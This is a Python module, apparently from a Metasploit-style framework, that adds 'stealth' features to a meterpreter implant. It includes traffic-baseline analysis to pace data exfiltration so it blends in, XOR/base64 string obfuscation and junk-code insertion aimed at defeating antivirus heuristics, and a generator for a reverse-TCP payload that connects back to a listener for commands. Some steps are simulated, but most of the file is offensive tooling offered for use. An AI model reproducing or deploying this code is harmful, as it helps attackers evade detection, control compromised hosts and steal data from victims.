#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Advanced Meterpreter Improvements

Modern stealth techniques for meterpreter with:
- Network behavior analysis
- Adaptive exfiltration strategies
- Code obfuscation for heuristic defeat
- Simple, effective protocols
- User behavior mimicking

Author: P4x-ng
License: MSF_LICENSE
"""

import os
import sys
import time
import random
import hashlib
import statistics
from typing import Dict, List, Tuple, Optional
from collections import deque
from datetime import datetime, timedelta


class NetworkBehaviorAnalyzer:
    """
    Analyze typical network usage patterns to blend in.
    
    This analyzer studies normal network activity and recommends
    exfiltration strategies that match typical usage patterns.
    """
    
    def __init__(self, observation_window: int = 3600):
        """
        Initialize network behavior analyzer.
        
        Args:
            observation_window (int): Seconds to observe (default: 1 hour)
        """
        self.observation_window = observation_window
        self.traffic_samples = deque(maxlen=1000)
        self.connection_times = deque(maxlen=1000)
        self.packet_sizes = deque(maxlen=1000)
        
        self.start_time = time.time()
        self.baseline_established = False
        
    def record_traffic(self, bytes_sent: int, bytes_recv: int, 
                      connections: int, timestamp: Optional[float] = None):
        """
        Record network traffic observation.
        
        Args:
            bytes_sent (int): Bytes sent
            bytes_recv (int): Bytes received
            connections (int): Number of active connections
            timestamp (float): Timestamp (default: now)
        """
        if timestamp is None:
            timestamp = time.time()
        
        self.traffic_samples.append({
            'timestamp': timestamp,
            'bytes_sent': bytes_sent,
            'bytes_recv': bytes_recv,
            'connections': connections
        })
        
        # Check if baseline is established
        elapsed = timestamp - self.start_time
        if elapsed >= self.observation_window and not self.baseline_established:
            self.baseline_established = True
            print("[*] Network baseline established")
    
    def get_typical_usage_pattern(self) -> Dict:
        """
        Analyze and return typical usage patterns.
        
        Returns:
            dict: Usage pattern statistics
        """
        if not self.traffic_samples:
            return {}
        
        sent_bytes = [s['bytes_sent'] for s in self.traffic_samples]
        recv_bytes = [s['bytes_recv'] for s in self.traffic_samples]
        connections = [s['connections'] for s in self.traffic_samples]
        
        pattern = {
            'avg_sent': statistics.mean(sent_bytes) if sent_bytes else 0,
            'avg_recv': statistics.mean(recv_bytes) if recv_bytes else 0,
            'avg_connections': statistics.mean(connections) if connections else 0,
            'max_sent': max(sent_bytes) if sent_bytes else 0,
            'max_recv': max(recv_bytes) if recv_bytes else 0,
            'baseline_established': self.baseline_established
        }
        
        if len(sent_bytes) > 1:
            pattern['stdev_sent'] = statistics.stdev(sent_bytes)
            pattern['stdev_recv'] = statistics.stdev(recv_bytes)
        
        return pattern
    
    def recommend_exfil_strategy(self) -> Dict:
        """
        Recommend exfiltration strategy based on observed patterns.
        
        Returns:
            dict: Recommended strategy
        """
        pattern = self.get_typical_usage_pattern()
        
        if not pattern or not pattern.get('baseline_established'):
            # No baseline - use conservative approach
            return {
                'method': 'slow_drip',
                'max_bytes_per_transfer': 1024,
                'delay_between_transfers': 300,  # 5 minutes
                'reason': 'No baseline established - using conservative approach'
            }
        
        avg_sent = pattern['avg_sent']
        max_sent = pattern['max_sent']
        
        # Determine strategy based on typical usage
        if avg_sent > 100000:  # >100KB average - high bandwidth user
            return {
                'method': 'chunked_burst',
                'max_bytes_per_transfer': min(50000, max_sent // 2),
                'delay_between_transfers': 60,
                'reason': 'High bandwidth usage detected - using burst strategy'
            }
        
        elif avg_sent > 10000:  # >10KB average - moderate user
            return {
                'method': 'steady_stream',
                'max_bytes_per_transfer': min(10000, max_sent // 2),
                'delay_between_transfers': 120,
                'reason': 'Moderate usage detected - using steady stream'
            }
        
        else:  # Low bandwidth user
            return {
                'method': 'slow_drip',
                'max_bytes_per_transfer': min(2048, max_sent),
                'delay_between_transfers': 300,
                'reason': 'Low usage detected - using slow drip strategy'
            }


class CodeObfuscator:
    """
    Simple but effective code obfuscation for heuristic defeat.
    
    The best malware is barely malware - this obfuscator keeps
    things simple while defeating basic heuristics.
    """
    
    @staticmethod
    def obfuscate_string(s: str) -> str:
        """
        Obfuscate a string using simple encoding.
        
        Args:
            s (str): String to obfuscate
            
        Returns:
            str: Obfuscated string
        """
        # Simple XOR with random key
        key = random.randint(1, 255)
        encoded = ''.join(chr(ord(c) ^ key) for c in s)
        
        # Return as base64-like encoding
        import base64
        b64 = base64.b64encode(encoded.encode('latin1')).decode('ascii')
        
        return f"__decode__({repr(b64)}, {key})"
    
    @staticmethod
    def obfuscate_function_name(name: str) -> str:
        """
        Obfuscate function name using hash.
        
        Args:
            name (str): Original function name
            
        Returns:
            str: Obfuscated name
        """
        # Use hash of original name + salt
        salt = str(random.randint(1000, 9999))
        h = hashlib.md5((name + salt).encode()).hexdigest()[:8]
        return f"func_{h}"
    
    @staticmethod
    def add_junk_code(code: str, junk_ratio: float = 0.1) -> str:
        """
        Add junk code to obfuscate control flow.
        
        Args:
            code (str): Original code
            junk_ratio (float): Ratio of junk to real code
            
        Returns:
            str: Code with junk added
        """
        junk_statements = [
            "_ = random.randint(0, 100)",
            "__ = time.time()",
            "_tmp = os.path.exists('/tmp')",
            "if False: pass",
            "_x = [i for i in range(10)]",
        ]
        
        lines = code.split('\n')
        junk_count = int(len(lines) * junk_ratio)
        
        for _ in range(junk_count):
            insert_pos = random.randint(0, len(lines))
            junk = random.choice(junk_statements)
            lines.insert(insert_pos, junk)
        
        return '\n'.join(lines)


class StealthMeterpreter:
    """
    Enhanced meterpreter with modern stealth techniques.
    
    Features:
    - Network behavior analysis
    - Adaptive exfiltration
    - Code obfuscation
    - Simple protocols
    - User behavior mimicking
    """
    
    def __init__(self, config: Optional[Dict] = None):
        """
        Initialize stealth meterpreter.
        
        Args:
            config (dict): Configuration dictionary
        """
        self.config = config or {}
        self.analyzer = NetworkBehaviorAnalyzer(
            observation_window=self.config.get('observation_window', 3600)
        )
        self.obfuscator = CodeObfuscator()
        
        self.active = False
        self.exfil_queue = []
        
    def start(self):
        """Start the stealth meterpreter."""
        self.active = True
        print("[*] Stealth meterpreter started")
        
        # Begin network observation
        self._observe_network_baseline()
    
    def _observe_network_baseline(self):
        """Observe network baseline for blending in."""
        print("[*] Observing network baseline...")
        
        # In a real implementation, this would monitor actual network traffic
        # For now, simulate with random data
        for i in range(10):
            self.analyzer.record_traffic(
                bytes_sent=random.randint(1000, 50000),
                bytes_recv=random.randint(5000, 100000),
                connections=random.randint(5, 20)
            )
            time.sleep(0.1)
    
    def queue_exfiltration(self, data: bytes, priority: int = 1):
        """
        Queue data for exfiltration.
        
        Args:
            data (bytes): Data to exfiltrate
            priority (int): Priority level (1=low, 5=high)
        """
        self.exfil_queue.append({
            'data': data,
            'priority': priority,
            'queued_at': time.time()
        })
        
        print(f"[*] Queued {len(data)} bytes for exfiltration (priority {priority})")
    
    def exfiltrate_data(self) -> Dict:
        """
        Exfiltrate queued data using recommended strategy.
        
        Returns:
            dict: Exfiltration result
        """
        if not self.exfil_queue:
            return {'success': False, 'reason': 'No data queued'}
        
        # Get recommended strategy
        strategy = self.analyzer.recommend_exfil_strategy()
        
        print(f"[*] Using exfiltration strategy: {strategy['method']}")
        print(f"[*] Reason: {strategy['reason']}")
        
        # Sort queue by priority
        self.exfil_queue.sort(key=lambda x: x['priority'], reverse=True)
        
        # Exfiltrate based on strategy
        max_bytes = strategy['max_bytes_per_transfer']
        delay = strategy['delay_between_transfers']
        
        exfiltrated = []
        total_bytes = 0
        
        while self.exfil_queue and total_bytes < max_bytes:
            item = self.exfil_queue[0]
            data = item['data']
            
            if len(data) + total_bytes <= max_bytes:
                # Can fit this item
                exfiltrated.append(self.exfil_queue.pop(0))
                total_bytes += len(data)
            else:
                # Split the data
                can_send = max_bytes - total_bytes
                chunk = data[:can_send]
                item['data'] = data[can_send:]
                
                exfiltrated.append({
                    'data': chunk,
                    'priority': item['priority'],
                    'queued_at': item['queued_at']
                })
                total_bytes += len(chunk)
                break
        
        # Simulate sending (in real implementation, would actually send)
        print(f"[*] Exfiltrating {total_bytes} bytes...")
        print(f"[*] Next exfiltration in {delay} seconds")
        
        return {
            'success': True,
            'bytes_sent': total_bytes,
            'items_sent': len(exfiltrated),
            'remaining_queue': len(self.exfil_queue),
            'next_delay': delay,
            'strategy': strategy['method']
        }
    
    def generate_obfuscated_payload(self, payload_code: str) -> str:
        """
        Generate obfuscated payload.
        
        Args:
            payload_code (str): Original payload code
            
        Returns:
            str: Obfuscated payload
        """
        # Add junk code
        obfuscated = self.obfuscator.add_junk_code(payload_code)
        
        # Wrap in decoder stub
        stub = f'''
import base64
import random
import time
import os

def __decode__(data, key):
    decoded = base64.b64decode(data).decode('latin1')
    return ''.join(chr(ord(c) ^ key) for c in decoded)

# Obfuscated payload
{obfuscated}
'''
        
        return stub
    
    def stop(self):
        """Stop the stealth meterpreter."""
        self.active = False
        print("[*] Stealth meterpreter stopped")


def create_stealth_payload(payload_type: str = 'reverse_tcp',
                          lhost: str = '127.0.0.1',
                          lport: int = 4444) -> str:
    """
    Create a stealth meterpreter payload.
    
    Args:
        payload_type (str): Type of payload
        lhost (str): Listener host
        lport (int): Listener port
        
    Returns:
        str: Generated payload code
    """
    template = f'''#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Stealth Meterpreter Payload
Generated by Metasploit PyNative

Type: {payload_type}
LHOST: {lhost}
LPORT: {lport}
"""

import socket
import time
import random

# Initialize stealth meterpreter
from lib.msf.core.advanced_meterpreter import StealthMeterpreter

meterpreter = StealthMeterpreter()
meterpreter.start()

# Connect back
try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(('{lhost}', {lport}))
    
    # Main loop
    while True:
        # Receive commands
        data = sock.recv(4096)
        if not data:
            break
        
        # Process and queue response
        response = b"Command executed"
        meterpreter.queue_exfiltration(response)
        
        # Exfiltrate using adaptive strategy
        result = meterpreter.exfiltrate_data()
        
        # Sleep to blend in
        time.sleep(random.uniform(1, 5))

except Exception as e:
    print(f"Error: {{e}}")

finally:
    meterpreter.stop()
'''
    
    return template


if __name__ == '__main__':
    # Test the stealth meterpreter
    print("[*] Testing Stealth Meterpreter")
    
    meterpreter = StealthMeterpreter()
    meterpreter.start()
    
    # Queue some test data
    meterpreter.queue_exfiltration(b"Test data 1", priority=3)
    meterpreter.queue_exfiltration(b"Test data 2" * 100, priority=5)
    meterpreter.queue_exfiltration(b"Test data 3", priority=1)
    
    # Test exfiltration
    result = meterpreter.exfiltrate_data()
    print(f"\n[*] Exfiltration result: {result}")
    
    # Test obfuscation
    sample_code = "print('Hello World')"
    obfuscated = meterpreter.generate_obfuscated_payload(sample_code)
    print(f"\n[*] Obfuscated payload length: {len(obfuscated)} bytes")
    
    meterpreter.stop()
